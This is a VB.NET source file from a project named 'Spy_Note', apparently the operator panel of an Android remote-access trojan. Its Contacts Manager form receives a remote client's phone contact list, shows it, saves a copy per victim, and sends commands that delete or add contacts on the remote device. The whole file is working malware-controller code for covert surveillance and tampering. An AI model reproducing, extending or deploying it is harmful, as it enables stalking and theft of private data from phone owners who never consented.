Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Contacts_Manager
    Private imageList_0 As ImageList
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub New()
        Me.imageList_0 = New ImageList()
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Not Me.Panel3.Visible
                    If flag3 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Me.DataGridView1.Rows.Clear()
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Line}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim stringBuilder As StringBuilder = New StringBuilder()
                    Dim num As Integer = array2.Length - 1
                    For i As Integer = 0 To num
                        Dim separator3 As String() = New String() {My.Forms.Form1.s.split_Ary}
                        Dim array3 As String() = array2(i).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                        Dim num2 As Integer = Me.imageList_0.Images.IndexOfKey(array3(2).ToUpper())
                        If num2 = -1 Then
                            Dim text As String = array3(2).ToUpper()
                            Dim flag4 As Boolean = text.Contains("sim".ToUpper())
                            If flag4 Then
                                num2 = Me.imageList_0.Images.IndexOfKey("sim".ToUpper())
                            Else
                                num2 = Me.imageList_0.Images.IndexOfKey("phone".ToUpper())
                            End If
                        End If
                        Me.DataGridView1.Rows.Add(New Object() {Me.imageList_0.Images(num2), array3(0), array3(1), array3(2)})
                        stringBuilder.AppendFormat("{0}", String.Concat(New String() {array3(0), " , ", array3(1), " , ", array3(2), vbCrLf}))
                    Next
                    store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Contacts_Manager", stringBuilder.ToString())
                    Me.refres_title()
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Contacts Manager - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub

    Private Sub Contacts_Manager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.RefreshToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
        Me.DeleteToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")
        Me.AddContactToolStripMenuItem.Image = store_0.Bitmap_0("ctx_add")
        Me.ContextMenuStrip1.Renderer = New Theme_0()
        Dim flag As Boolean = False
        Dim files As String() = Directory.GetFiles(Application.StartupPath + "\" + store_0.name_folder_app_resource + "\icons\contacts_manager\")
        For Each text As String In files
            Dim flag2 As Boolean = Not flag
            If flag2 Then
                Me.icon_0.Width = Image.FromFile(text).Size.Width
                Me.imageList_0.ImageSize = New Size(Image.FromFile(text).Size.Width, Image.FromFile(text).Size.Height)
                Me.imageList_0.ColorDepth = ColorDepth.Depth32Bit
                flag = True
            End If
            Dim path As String = text
            Dim fileNameWithoutExtension As String = IO.Path.GetFileNameWithoutExtension(path)
            Me.imageList_0.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text))
        Next
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "contacts_manager")
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim flag As Boolean = Me.DataGridView1.SelectedRows.Count > 0
        If flag Then
            Dim num As Integer = Me.DataGridView1.SelectedRows.Count - 1
            For i As Integer = num To 0 Step -1
                My.Forms.Form1.s.Send(Me.handle_Number_Client, Conversions.ToString(Operators.AddObject("contacts_manager_delete" + My.Forms.Form1.s.SplitData, Me.DataGridView1.Rows(Me.DataGridView1.SelectedRows(i).Index).Cells(1).Value)))
                Me.DataGridView1.Rows.RemoveAt(Me.DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub AddContactToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddContactToolStripMenuItem.Click
        Dim add_Contacts As Add_Contacts = New Add_Contacts()
        add_Contacts.ShowDialog()
        Dim flag As Boolean = add_Contacts.DialogResult = DialogResult.OK
        If flag Then
            Dim text As String = add_Contacts.TextBox1.Text
            Dim text2 As String = add_Contacts.TextBox2.Text
            My.Forms.Form1.s.Send(Me.handle_Number_Client, String.Concat(New String() {"contacts_manager_write", My.Forms.Form1.s.SplitData, text, My.Forms.Form1.s.SplitData, text2}))
        End If
        add_Contacts.Dispose()
        add_Contacts.Close()
    End Sub
End Class